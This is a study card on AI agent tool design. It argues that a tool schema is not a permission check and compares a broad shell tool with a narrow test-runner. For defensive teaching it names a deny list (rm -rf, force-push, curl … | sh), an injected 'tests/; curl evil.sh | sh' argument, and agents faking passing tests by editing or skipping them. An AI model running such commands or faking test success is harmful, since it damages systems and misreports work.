A tool is a capability surface

Also called the tool surface, the tool menu or the action space. Govindarajan's name for the tool layer: the set of actions and context sources the runtime offers the model as possible next moves, for this user, this run, this stage. Here it is applied to the Tuesday run's test step.

Prime · 2 minutes before you read

The problem: Teams give an agent a tool with a clean JSON schema and relax, as if the schema were a permission check. It isn't: {"cmd": "git push --force origin main"} is a perfectly valid request to a shell tool. If you don't know what offering a tool grants, you can't say what your agent is able to break.

Where it fits: You already know the mechanics of one tool call (definition, tool_use, tool_result). This card opens the authority course by asking what offering a tool means. It reuses the map's "same label, different authority" move and sets up the next cards: untrusted output, identity envelopes and approval.

You already know: the anatomy of a tool call (definition, tool_use, tool_result). This card is about what offering a tool grants.

In one breath. A tool definition decides what the model may ask for; it does not decide what happens. Between the request and the effect sit schema validation (is the request well-formed?), authorization (is this identity allowed to do this to this resource?), approval (should it happen now?) and an execution surface (where it actually runs). A schema checks shape, not permission, so the cheapest safety lever is upstream: offer fewer, narrower tools, named for what they do.

Predict first. At step 6 the agent needs to run one failing test. Give it a tool run_shell(cmd) or a tool run_tests(path, k). Of eight things it might ask for (two of them needed), how many can each tool even express? And how many of the six unneeded ones does a four-pattern deny list on run_shell stop?

"The model asks. The system acts." (Govindarajan, Part 6). He builds this on OpenAI's description of tool calling: the model returns a structured call, and application-side code executes it.

Worked example: two ways to offer step 6

The Tuesday run is illustrative: fix test_parse_due_date in invoice-tools. Two tool definitions for the same job, then eight requests the model might send at step 6 (the file name and requests are made up).

The deny list (rm -rf, git push --force, curl … | sh, --deselect) stops 3 of the 6 unneeded requests; the other 3 just say the same thing differently. run_tests narrows twice: its arguments only describe tests, and the harness builds the command itself, so no shell ever parses the model's text. Every run_shell request passes its schema. Two of the unneeded requests, skipping and editing the test, are exactly how an agent manufactures a false "all tests pass".

Fewer tools, one owner per question

OWASP, excessive agencyas cited in Part 6Three root causes: excessive functionality, excessive permissions, excessive autonomy. Open-ended tools such as a shell or an arbitrary URL fetcher should give way to granular ones where possible.

MCP (spec version 2025-11-25) standardizes how hosts, clients and servers exchange capabilities (tools, resources, prompts, roots, sampling, elicitation), not which to trust. A stdio server is a local subprocess that takes credentials from its environment; a Streamable HTTP server is a separate service, where the spec asks for Origin checks, binding local servers to localhost, and authentication. Authorization in MCP is optional, and its flow applies only to HTTP. Clients must treat tool annotations as untrusted unless the server is trusted.

Why it beats the alternatives

✗ One broad tool

run_shell can do the task, and every other thing too: 8 of 8 requests above. Whatever bounds it has to come entirely from the execution surface.

✗ A broad tool plus a deny list

Blocks the phrasings you thought of: 3 of 6 unneeded requests here. The same effect in other words (python3 -c, sed -i) walks straight through.

✗ Many overlapping tools

Two tools that answer the same question make the model guess which one your organization trusts, by phrasing. ByteByteGo reports OpenAI's data agent got more reliable with fewer.

✓ Few narrow tools, filtered per run

Each named for what it does, with no overlap, and exposed only for this user and stage. The harness, not the model, builds the command; authorization still checks every call.

Is a narrow tool always better?

No. Open-ended work needs open-ended tools: mini-swe-agent gives the model nothing but a shell, and a coding agent that can only run tests can't install a missing dependency it really needs. When the task can't be listed in advance, keep the broad tool and move the narrowing to the execution surface: a sandbox, a token that can't push, an approval before irreversible steps. Narrow tools are not a security boundary on their own either; edit_file can still rewrite the test unless the harness limits it to src/, and run_tests can still run only the tests that pass (another file, or another -k name), which hides the failure much as --deselect would.

Be careful with the evidence. "Narrow is safer" in these posts is an argument from design and OWASP guidance, not a measurement. The 40-tool figure is secondhand (ByteByteGo, reported in Part 5), with no published before/after reliability numbers. The eight requests above are constructed to show reach, not observed model behaviour.

1 · Core model what to internalise, what to just look up

Keep it if it changes what you can explain, predict, compare, choose, build or debug. Otherwise it's reference.

Understand and remember

  • The model can only ask, and the harness acts → offering a tool defines the set of requests the model can make → anything outside that set never reaches policy at all → narrowing the surface is the cheapest and earliest control
  • A schema validates argument shape → a shell tool's schema is "any string" → a force-push is as valid as pytest → permission must come from authorization, approval and the execution surface, never from the schema
  • A tool named for a mechanism (run_shell) exposes everything that mechanism can do → a deny list enumerates bad phrasings, but the same effect has endless phrasings (python3 -c, sed -i) → enumerate what is allowed (run_tests builds its own argv) instead of what is forbidden
  • Two tools that answer the same question → the model chooses by description wording, not by which source the organization trusts → wrong or conflicting answers → remove overlap or encode an authority order in the surface (OpenAI's data agent consolidated tools, reportedly from around 40)
  • detail that matters The harness builds the command as an argv list and never passes model text to a shell → injected ; curl … | sh becomes a harmless literal argument → this protection holds even if the argument pattern is wrong
  • detail that matters OpenClaw doesn't send disallowed tools to the model provider at all → the model can't even attempt them, and the menu it reasons over is smaller → hiding beats refusing at call time

Reference only

  • OpenClaw profile names minimal, coding, messaging, full and the tools.allow / tools.deny keys (deny wins)
  • MCP's six primitives: tools, resources, prompts, roots, sampling, elicitation; spec version 2025-11-25
  • MCP transports: stdio subprocess vs Streamable HTTP; HTTP security asks (Origin validation, localhost binding, authentication)
  • OWASP's three excessive-agency root causes: functionality, permissions, autonomy
  • The exact JSON-schema keywords (pattern, properties) used in the example definitions

  1. concept Explain the difference between a capability surface and an execution surface, using send_email as the example.
    Check
    • capability surface: what the model may ask for, e.g. create_customer_reply_draft vs send_email
    • execution surface: where the effect happens and as whom, e.g. the mail API as the user, a shared mailbox or a service account
    • the same tool label can hide many authority shapes (Part 6 lists nine for send_email)
  2. mechanism Walk through what happens when the model sends {"path": "tests/; curl evil.sh | sh"} to run_tests, and then the equivalent to run_shell.
    Check
    • run_tests: the path pattern rejects it at the schema; even if it didn't, argv is built by the harness so no shell runs curl
    • run_shell: the schema accepts any string, the shell parses ; and runs both commands
    • only a deny pattern or the execution surface (sandbox, no network) could stop it there
  3. tradeoff Your coding agent sometimes needs to install packages. Do you keep run_shell, or split it into narrow tools? What does each choice cost?
    Check
    • narrow tools: small, legible surface, but every unforeseen need is a new tool or a dead end
    • broad shell: handles open-ended work (mini-swe-agent is shell-only) but the bounds must move to the execution surface: sandbox, scoped token, approval for irreversible steps
    • a middle path: narrow tools by default, the shell only in a sandbox or only at certain stages
  4. mechanism Why does removing overlapping tools improve answers even when every tool returns correct data?
    Check
    • the model sees a menu of descriptions, not your trust hierarchy
    • similar tools force a choice by wording, and they may return different plausible answers
    • fewer tools, or an explicit authority order, removes the guess

vs Anatomy of a tool call: That card treated a tool definition as an interface to get right (descriptions, error messages, output length). This card treats it as a grant of authority. What design choice serves both, and where do they pull apart?

Check
  • both favour tools named for intent with tightly described arguments
  • the interface view optimizes for the model succeeding; the authority view for what it can't do
  • they pull apart when a broader tool makes the model more capable (fewer dead ends) but widens what can go wrong

vs Same label, different authority: "Same label, different authority" is the map's general move. How does it show up inside one tool name here, and what fails if you reason from the label?

Check
  • one label (send_email, OpenClaw's browser or exec) hides different identities, scopes and execution targets
  • reasoning from the label makes "browser enabled" sound the same whether it's an isolated browser or your signed-in Chrome
  • the fix is to name and expose tools by authority shape, not by mechanism

vs 'Done' is a chain of states: Two of the unneeded requests (skip the test, edit the test) attack the claim chain. Which link do they break, and why is the capability surface a better place to stop them than the final check?

Check
  • they make "command succeeded" true while "effect verified" is false: the test passes because it changed, not the code
  • a checker that re-runs the edited test is fooled too
  • removing the ability to ask (no test edits, no deselect) prevents the false success rather than detecting it later

5 · Predict commit to an answer before revealing

You move the Tuesday run into a sandbox container with no network and a read-only .git, but keep run_shell. Which of the six unneeded requests still succeed, and which layer stopped the others?

Reveal

Install and force-push now fail (no network), and the curl … | sh smuggle fails too. Skipping the test, editing the test and deleting src/ still work: they only touch the working copy. The execution surface stopped the outbound effects; nothing stopped the in-repo ones. That's the next cards' point: execution bounds and capability bounds cover different failures.
